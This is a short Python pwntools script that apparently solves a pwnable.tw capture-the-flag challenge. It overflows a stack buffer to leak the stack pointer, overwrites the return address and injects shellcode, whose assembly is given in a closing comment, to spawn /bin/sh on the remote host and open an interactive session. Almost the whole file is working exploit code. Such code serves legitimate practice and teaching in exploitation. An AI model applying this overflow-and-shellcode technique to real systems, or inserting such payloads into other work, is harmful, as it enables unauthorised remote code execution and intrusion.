#!/usr/bin/env python
from pwn import *

r = remote('chall.pwnable.tw', 10000)
print r.recvuntil(":")

mov_ecx_esp = 0x8048087
sh = open('/tmp/del/sh.bin').read()

r.send('a'*20 + p32(mov_ecx_esp))
esp = u32(r.recv(4))
print "esp: ",hex(esp)
r.send('a'*20 + p32(esp + 20) + sh)
r.interactive()

"""
## sh.asm
 jmp sh
se:
 pop ebx
 xor eax,eax
 cdq
 xor ecx,ecx
 mov al,0xb
 int 0x80
sh:
 call se
 db '/bin/sh',0

"""
